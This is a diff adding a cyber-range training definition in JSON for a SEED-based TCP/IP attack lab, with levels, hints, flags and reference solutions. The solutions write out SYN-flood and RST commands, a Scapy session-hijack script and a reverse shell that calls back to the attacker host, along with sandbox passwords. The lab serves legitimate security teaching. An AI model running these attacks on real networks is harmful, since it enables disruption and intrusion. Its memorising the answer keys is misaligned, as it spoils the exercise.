@@ -1,0 +1,429 @@
+{
+  "title": "TCP/IP Attack Lab",
+  "description": "Hands-on training covering SYN flooding, TCP RST attacks, TCP session hijacking and reverse shells, based on the SEED Labs TCP/IP Attack Lab.",
+  "prerequisites": [
+    "Basic Linux command line",
+    "Basic TCP/IP (3-way handshake, sequence/ack numbers, ports)",
+    "Comfortable reading packet captures (tcpdump/Wireshark)"
+  ],
+  "outcomes": [
+    "You will understand why TCP's lack of built-in authentication allows SYN flooding, RST, and session-hijacking attacks.",
+    "You will be able to perform a SYN flooding attack and explain why SYN cookies mitigate it.",
+    "You will be able to perform a TCP RST attack to tear down telnet, SSH and a long-lived streaming connection, and explain why encryption does not prevent it.",
+    "You will be able to hijack a live telnet session to inject a command, and chain this into a reverse shell."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# General information: please read carefully\n\n* This training is directly based on the **SEED Labs TCP/IP Attack Lab** (Wenliang Du). The attached PDF handout is your reference material for the theory behind every attack - keep it open while you work.\n* The IP addresses, ports and parameters used in this sandbox are **different from the ones in the PDF handout**. You cannot copy/paste the example values from the PDF; you must adapt every command to this environment.\n* The solution of a level **will be required** in later levels. Do not try to skip ahead.\n* If you get stuck, you may use the hints (they cost points) or search the attached PDF and online documentation.\n* This game is for educational purposes only, performed inside an isolated sandbox you are authorized to attack. Never run these techniques against systems you do not own or have explicit written permission to test.\n* Scoring: this training is graded out of **20 points**. Every hint you open has a penalty between **0.5 and 2 points**, deducted from that level's score.\n\n# Storyline intro\n\nYou are a security trainee at a small consultancy. Your mentor has set up an isolated practice network with three machines: `attacker` (your machine), `server` and `client`, all on the same LAN - exactly the assumption SEED Labs makes so you can sniff traffic between the client and the server. Your job today is to reproduce, end to end, the classic TCP/IP attacks: SYN flooding, TCP RST, TCP session hijacking, and pivoting a hijacked session into a reverse shell."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear.\n2. Login with username **`user`** and password **`Password123`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
+      "local_content": "This sandbox has not been tested for use with local sandbox."
+    },
+    {
+      "title": "Mapping the LAN",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "2323",
+      "answer_variable_name": null,
+      "content": "Before attacking anything, you need to know what is actually out there. Your `attacker` machine sits on the `10.1.26.0/24` network together with `server` and `client`, but you don't know their exact IP addresses or which services they run yet.\n\nScan the subnet and identify:\n* the `server` machine (it will be running SSH, a telnet service, and a small custom TCP service),\n* the `client` machine (it mostly just talks outbound to the server).\n\n**Note:** the telnet service in this sandbox is **not** on its usual port - this is deliberate so you cannot just reuse the SEED Labs PDF's default assumptions. You need to actually scan for it.\n\nThe flag is the port number the telnet service is listening on.",
+      "solution": "```\nuser@attacker:~$ nmap -sV 10.1.26.0/24\n...\nNmap scan report for 10.1.26.9 (server)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n2323/tcp open  telnet\n9091/tcp open  xmp-one?\n...\n```\nThe telnet service is on TCP port **2323**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which nmap options help here?",
+          "content": "`-sV` (service/version detection) and scanning the whole subnet at once (`nmap -sV 10.1.26.0/24`) will show you every host and every open port in one pass.",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "The telnet port is not 23",
+          "content": "Look through the full port list returned by nmap for the server's IP - telnet has deliberately been moved off its default port in this sandbox.",
+          "hint_penalty": 1,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "lan_scanned",
+          "prereq_state": [],
+          "cmd": "nmap -sV 10.1.26.0/24",
+          "cmd_type": "bash-command",
+          "cmd_regex": "nmap .*-sV.*10\\.1\\.26\\.0/24",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Diagnostic access & reading the SYN backlog",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "333",
+      "answer_variable_name": null,
+      "content": "Your mentor has set you up with a diagnostic account on the server, `seedlab` / `Att@ckTCP25`, so you can check server-side state after each attack (exactly the way the lab asks you to compare `netstat -na` before and after an attack).\n\nSSH into the server (`10.1.26.9`) with that account and check the size of the queue used for half-opened TCP connections, i.e. the setting the SEED Labs PDF describes in Task 1:\n```\nsudo sysctl -q net.ipv4.tcp_max_syn_backlog\n```\n\nThe flag is the value returned.",
+      "solution": "```\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@10.1.26.9's password: Att@ckTCP25\n\nseedlab@server:~$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog\nnet.ipv4.tcp_max_syn_backlog = 333\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How do I log in?",
+          "content": "Use `ssh seedlab@10.1.26.9` and the password given in the task text.",
+          "hint_penalty": 0.5,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 1.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "ssh_diag_access",
+          "prereq_state": [
+            "lan_scanned"
+          ],
+          "cmd": "ssh seedlab@10.1.26.9",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ssh seedlab@10\\.1\\.26\\.9",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "SYN Flooding Attack",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "answer": "netwox 76 -i 10.1.26.9 -p 2323",
+      "answer_variable_name": null,
+      "content": "Read Task 1 (\"SYN Flooding Attack\") of the attached SEED Labs TCP/IP Attack Lab PDF. The corresponding Netwox tool is numbered **76**.\n\nFrom `attacker`, launch a SYN flood against the server's telnet port you found earlier. While the attack is running, SSH into the server with the `seedlab` diagnostic account (from the previous level) and run `netstat -na` on a separate connection - you should see many connections to the telnet port stuck in `SYN-RECV` state.\n\nIf you cannot get `netwox` working, an equivalent Scapy one-liner (looping `send()` of spoofed SYN packets to `10.1.26.9:2323`) is also accepted by your mentor, but the submitted flag below must still be the exact netwox invocation.\n\nThe flag is the exact `netwox` command (with IP and port filled in) used to flood the server's telnet port.",
+      "solution": "```\nuser@attacker:~$ sudo netwox 76 -i 10.1.26.9 -p 2323\n```\nOn the server, before the attack `netstat -na | grep 2323` shows no half-opened connections; during the attack it shows dozens of entries in `SYN-RECV` state, up to the `net.ipv4.tcp_max_syn_backlog` limit (333) found in the previous level.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where do I find the tool number?",
+          "content": "Section 3.1 of the attached PDF (\"Task 1: SYN Flooding Attack\") names the Netwox tool number for this attack.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "What is the exact syntax?",
+          "content": "`netwox 76 -i <destination-ip> -p <destination-port>`. Use the server's IP and the telnet port you discovered in the recon level.",
+          "hint_penalty": 1.5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 3,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "syn_flood_launched",
+          "prereq_state": [
+            "lan_scanned"
+          ],
+          "cmd": "netwox 76 -i 10.1.26.9 -p 2323",
+          "cmd_type": "bash-command",
+          "cmd_regex": "netwox 76 -i 10\\.1\\.26\\.9 -p 2323",
+          "optional": false
+        },
+        {
+          "state_name": "syn_recv_observed",
+          "prereq_state": [
+            "syn_flood_launched",
+            "ssh_diag_access"
+          ],
+          "cmd": "netstat -na",
+          "cmd_type": "bash-command",
+          "cmd_regex": "netstat -na",
+          "optional": true
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Turning on SYN cookies",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "sysctl -w net.ipv4.tcp_syncookies=1",
+      "answer_variable_name": null,
+      "content": "SYN cookies are currently **disabled** on the server, which is why your flood worked so well. On the server (via the `seedlab` SSH account), turn SYN cookies on, then repeat the SYN flood from `attacker` and compare `netstat -na` again - the half-opened connection queue should no longer fill up the same way.\n\nThe flag is the exact command (with option and value) used to enable SYN cookies.",
+      "solution": "```\nseedlab@server:~$ sudo sysctl -w net.ipv4.tcp_syncookies=1\nnet.ipv4.tcp_syncookies = 1\n```\nRe-running `netwox 76 -i 10.1.26.9 -p 2323` now produces far fewer (or no) persistent `SYN-RECV` entries, because the kernel answers with cryptographically-encoded SYN-ACKs instead of allocating backlog entries.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which sysctl parameter?",
+          "content": "`sysctl -w parameter=value` sets a kernel parameter live. The parameter you need is `net.ipv4.tcp_syncookies`.",
+          "hint_penalty": 0.5,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 1.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "syncookies_enabled",
+          "prereq_state": [
+            "syn_flood_launched"
+          ],
+          "cmd": "sysctl -w net.ipv4.tcp_syncookies=1",
+          "cmd_type": "bash-command",
+          "cmd_regex": "sysctl -w net\\.ipv4\\.tcp_syncookies=1",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "TCP RST Attack - telnet",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 4,
+      "minimal_possible_solve_time": null,
+      "answer": "netwox 78 -d eth0 -f \"tcp and port 2323\"",
+      "answer_variable_name": null,
+      "content": "The `client` machine keeps a live telnet session open to the server's telnet service the whole time (it reconnects automatically, so you cannot \"use up\" it). Read Task 2 of the attached PDF (\"TCP RST Attacks on telnet and ssh Connections\"). The corresponding Netwox tool is numbered **78**.\n\nFrom `attacker`, sniff the LAN and use a TCP RST attack to break the live telnet session (port 2323) between `client` and `server`. You should observe (e.g. via `tcpdump -i eth0 port 2323`) the connection reset, immediately followed by the client's automatic reconnect.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
+      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 2323\"\n```\nWatching `tcpdump -i eth0 port 2323` while this runs shows RST packets being injected and the existing telnet TCP stream terminating, after which the client machine immediately opens a brand-new connection.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which tool and option resets connections?",
+          "content": "Netwox tool `78` resets every TCP packet matching a pcap filter, passed with `-f`.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "What filter do I need?",
+          "content": "A pcap filter restricting to the telnet port: `tcp and port 2323`.",
+          "hint_penalty": 1,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "rst_telnet_done",
+          "prereq_state": [
+            "syncookies_enabled"
+          ],
+          "cmd": "netwox 78 -d eth0 -f \"tcp and port 2323\"",
+          "cmd_type": "bash-command",
+          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 2323.",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "TCP RST Attack - SSH",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "netwox 78 -d eth0 -f \"tcp and port 22\"",
+      "answer_variable_name": null,
+      "content": "The `client` machine also keeps a persistent SSH session open to the server. Repeat the TCP RST attack, this time against that SSH connection (port 22), and observe that it breaks exactly the same way as the unencrypted telnet session did - TCP RST attacks exploit TCP itself, not the application layer, so encryption gives no protection against them.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
+      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 22\"\n```\nThe SSH session drops with a `Connection reset by peer` / `kex_exchange_identification` style error on the client side, even though the attacker never saw any of the encrypted SSH payload.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Same attack, different port",
+          "content": "Reuse the exact same technique as the telnet RST level, just change the filter's port number to 22.",
+          "hint_penalty": 1,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "rst_ssh_done",
+          "prereq_state": [
+            "rst_telnet_done"
+          ],
+          "cmd": "netwox 78 -d eth0 -f \"tcp and port 22\"",
+          "cmd_type": "bash-command",
+          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 22.",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "TCP RST Attack - radio stream",
+      "level_type": "TRAINING_LEVEL",
+      "order": 8,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "netwox 78 -d eth0 -f \"tcp and port 9091\"",
+      "answer_variable_name": null,
+      "content": "Finally, read Task 3 of the attached PDF (\"TCP RST Attacks on Video Streaming Applications\"). In this sandbox, the server runs a small always-on streaming service instead of a real video site (you already saw it in your nmap scan from the first level), and `client` keeps a permanent connection open to it, just like a user watching a stream.\n\nDisrupt that streaming connection the same way as before.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
+      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 9091\"\n```\nThe streaming client's output stops abruptly mid-line and then a brand-new connection starts, exactly like a viewer whose video playback gets interrupted and reloads.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which port is the streaming service on?",
+          "content": "It was in your very first nmap scan of the server, alongside ssh and telnet (it is **9091**).",
+          "hint_penalty": 0.5,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 1.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "rst_stream_done",
+          "prereq_state": [
+            "rst_ssh_done"
+          ],
+          "cmd": "netwox 78 -d eth0 -f \"tcp and port 9091\"",
+          "cmd_type": "bash-command",
+          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 9091.",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "TCP Session Hijacking",
+      "level_type": "TRAINING_LEVEL",
+      "order": 9,
+      "estimated_duration": 6,
+      "minimal_possible_solve_time": null,
+      "answer": "TCPHIJACK-9f41",
+      "answer_variable_name": null,
+      "content": "Breaking a connection is noisy and easy to notice. Read Task 4 of the attached PDF (\"TCP Session Hijacking\"): instead of resetting the telnet session, you will inject a command into it while leaving it alive, exactly as a real attacker would to plant a backdoor unnoticed.\n\nSteps:\n1. Sniff the live telnet session (port 2323) between `client` and `server` with `tcpdump`/`tshark` to read the current source port, sequence number and ack number of an in-flight packet.\n2. Using Netwox tool **40** (or the Scapy skeleton from the PDF, adapted to this sandbox's addresses), craft and send a spoofed packet that looks like it comes from `client`, carrying the following command as TCP payload:\n```\necho TCPHIJACK-9f41 > /tmp/hijack_proof.txt\n```\n3. Confirm the injection worked by SSHing into the server with the `seedlab` diagnostic account and reading `/tmp/hijack_proof.txt`.\n\nThe flag is the exact string that gets written into `/tmp/hijack_proof.txt`.",
+      "solution": "```\nuser@attacker:~$ sudo tcpdump -i eth0 -nn tcp port 2323\n... (read seq, ack, client source port from a captured packet)\n\nuser@attacker:~$ python3\n>>> from scapy.all import *\n>>> ip  = IP(src=\"10.1.26.4\", dst=\"10.1.26.9\")\n>>> tcp = TCP(sport=<client_src_port>, dport=2323, flags=\"PA\", seq=<seq>, ack=<ack>)\n>>> data = \"echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt\\r\"\n>>> send(ip/tcp/data, verbose=0)\n\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@server:~$ cat /tmp/hijack_proof.txt\nTCPHIJACK-9f41\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where do seq/ack/port come from?",
+          "content": "Capture a live packet of the ongoing telnet session with `tcpdump -i eth0 -nn tcp port 2323` (or Wireshark) and read its sequence number, ack number and the client's source port - you need all three to build a packet the server will accept as the next one in that stream.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "What exact command do I need to inject?",
+          "content": "`echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt` - this is the exact text that must reach the server as TCP payload.",
+          "hint_penalty": 1.5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 3.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "session_hijacked",
+          "prereq_state": [
+            "rst_stream_done"
+          ],
+          "cmd": "cat /tmp/hijack_proof.txt",
+          "cmd_type": "bash-command",
+          "cmd_regex": "cat /tmp/hijack_proof\\.txt",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Reverse Shell via TCP Session Hijacking",
+      "level_type": "TRAINING_LEVEL",
+      "order": 10,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "answer": "SEED-TCPLAB-FINAL-7e2b9c",
+      "answer_variable_name": null,
+      "content": "One injected command is fun, but a real attacker wants persistent, convenient access. Read Task 5 of the attached PDF (\"Creating Reverse Shell using TCP Session Hijacking\").\n\n1. On `attacker`, start a listener: `nc -lvp 4444`.\n2. Using TCP session hijacking (same technique as the previous level, against a *new* in-flight packet - your old sequence numbers are now stale), inject a reverse shell one-liner into the live telnet session so the server connects back to your listener, e.g.:\n```\n/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\n```\n3. Once your listener catches the shell, you will be running as the `victim` account on the server (the same account the hijacked telnet session belongs to). Read its final flag file.\n\nThe flag is the content of `~/flag_final.txt` as read through your reverse shell.",
+      "solution": "```\nuser@attacker:~$ nc -lvp 4444\n\n# in a second terminal: capture a fresh packet, then inject:\nuser@attacker:~$ python3\n>>> from scapy.all import *\n>>> ip  = IP(src=\"10.1.26.4\", dst=\"10.1.26.9\")\n>>> tcp = TCP(sport=<client_src_port>, dport=2323, flags=\"PA\", seq=<new_seq>, ack=<new_ack>)\n>>> data = \"/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\\r\"\n>>> send(ip/tcp/data, verbose=0)\n\n# back in the nc terminal:\nConnection from 10.1.26.9 received!\nvictim@server:~$ cat flag_final.txt\nSEED-TCPLAB-FINAL-7e2b9c\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Start the listener first",
+          "content": "Start `nc -lvp <port>` on `attacker` BEFORE you inject the reverse-shell command, otherwise the connection back has nothing to connect to. Use `10.1.26.23` (your own attacker IP) as the callback address.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "Whose shell do I get, and where is the flag?",
+          "content": "The hijacked session belongs to the `victim` account, so your reverse shell runs as `victim`. Its home directory contains `flag_final.txt`.",
+          "hint_penalty": 1.5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2.5,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "finish",
+          "prereq_state": [
+            "session_hijacked"
+          ],
+          "cmd": "cat flag_final.txt",
+          "cmd_type": "bash-command",
+          "cmd_regex": "cat flag_final\\.txt",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    }
+  ],
+  "estimated_duration": 35,
+  "variant_sandboxes": false
+}
